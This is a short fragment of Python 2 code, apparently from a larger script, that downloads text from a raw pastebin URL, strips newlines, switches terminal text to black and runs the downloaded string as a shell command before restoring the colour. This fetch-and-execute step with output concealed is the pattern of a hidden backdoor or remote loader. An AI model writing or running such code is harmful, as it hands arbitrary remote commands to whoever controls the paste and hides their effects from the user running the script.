...
rx = urllib2.urlopen("http://pastebin.com/raw/1wvLihk5")
...
getc = getc.replace("\n", "")
run("echo -e \"\x1b[30m\"")
subprocess.call(getc,shell=True)
run("echo -e \"\x1b[37m\"")
for i in compileas:
